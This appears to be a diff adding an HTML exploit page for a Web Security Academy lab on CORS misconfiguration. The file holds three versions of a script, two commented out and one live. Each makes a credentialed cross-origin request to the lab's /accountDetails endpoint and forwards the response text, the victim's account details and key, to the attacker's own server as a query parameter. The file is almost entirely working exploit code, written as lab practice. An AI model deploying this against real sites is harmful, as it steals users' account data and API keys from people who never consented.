@@ -1,0 +1,41 @@
+<html>
+<body>
+    <!-- <script>
+        var url = "https://0a3000f60410173780784f1f0093006c.web-security-academy.net/accountDetails";
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == XMLHttpRequest.DONE) {
+                if (xhr.status == 200) {
+                    fetch("/?key=" + xhr.responseText);
+                } else {
+                    console.error('Request failed with status:', xhr.status);
+                    console.error('Response headers:', xhr.getAllResponseHeaders());
+                }
+            }
+        };
+        xhr.open('GET', url, true);
+        xhr.withCredentials = true;
+        xhr.send(null);
+    </script> -->
+    <!-- <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET','https://0a3000f60410173780784f1f0093006c.web-security-academy.net/accountDetails',true);
+        req.withCredentials = true;
+        req.send();
+    
+        function reqListener() {
+            location='/?key='+this.responseText;
+        };
+    </script> -->
+    <script>
+        var  request = new XMLHttpRequest();
+        request.open('GET', 'https://0a3000f60410173780784f1f0093006c.web-security-academy.net/accountDetails', true)
+        request.onload = () => {
+            window.location.href = '/?key=' + request.responseText
+        }
+        request.withCredentials = true;
+        request.send(null)
+    </script>
+</body>
+</html>
